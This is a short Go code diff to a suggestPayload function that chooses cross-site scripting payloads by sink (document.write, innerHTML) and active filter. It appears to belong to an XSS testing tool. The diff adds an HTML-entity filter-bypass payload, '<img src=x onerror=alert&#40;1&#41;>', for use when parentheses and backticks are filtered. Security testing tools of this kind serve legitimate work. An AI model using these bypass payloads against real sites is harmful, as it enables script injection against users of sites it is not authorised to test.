@@ -17,7 +17,19 @@ func suggestPayload(sinkFunc, filterType string) string {
 	lower := strings.ToLower(sinkFunc)
 	filterLower := strings.ToLower(filterType)
 
-	// If parentheses are filtered, use bypass payloads
+	// If parentheses and backticks are filtered, use HTML entity bypass
+	if strings.Contains(filterLower, "parentheses") && strings.Contains(filterLower, "backtick") {
+		switch {
+		case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
+			return `<img src=x onerror=alert&#40;1&#41;>`
+		case strings.Contains(lower, "innerhtml") || strings.Contains(lower, "outerhtml"):
+			return `<img src=x onerror=alert&#40;1&#41;>`
+		default:
+			return `<img src=x onerror=alert&#40;1&#41;>`
+		}
+	}
+
+	// If only parentheses are filtered, use backtick bypass
 	if strings.Contains(filterLower, "parentheses") || strings.Contains(filterLower, "()") {
 		switch {
 		case strings.Contains(lower, "document.write") || strings.Contains(lower, "writeln"):
